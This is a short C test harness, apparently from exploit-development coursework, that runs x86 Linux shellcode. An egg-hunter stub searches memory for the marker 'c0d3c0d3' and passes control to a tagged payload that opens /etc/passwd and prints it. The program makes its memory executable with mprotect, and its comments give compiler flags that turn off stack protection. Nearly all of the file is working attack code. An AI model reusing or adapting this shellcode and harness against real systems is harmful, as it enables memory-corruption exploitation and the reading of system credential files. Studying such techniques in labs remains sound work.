#include <sys/mman.h>
#include <stdio.h>
#include <string.h>

unsigned char hunter[] = "\xbe\x63\x30\x64\x33\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\x39\x32\x75\xef\x39\x72\x04\x75\xea\x83\xc2\x08\xff\xe2";
unsigned char code[] = "\x63\x30\x64\x33\x63\x30\x64\x33\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\x01\x10\x4a\xcd\x80\x92\x29\xc0\xb0\x04\xb3\x01\xcd\x80\xb0\x01\xcd\x80";
	

int main(){
    printf("Hunter length: %d\n", strlen(hunter));
    printf("Shellcode length: %d\n", strlen(code));


    int r =  mprotect((void *)((int)hunter & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
    printf("mprotect: %d\n",r);
    int (*ret)() = (int(*)())hunter;
    return ret();
    // return 1;
}

// gcc -fno-stack-protector -z execstack -m32 egg_hunter_test.c -o egg_hunt 
// ./egg_hunt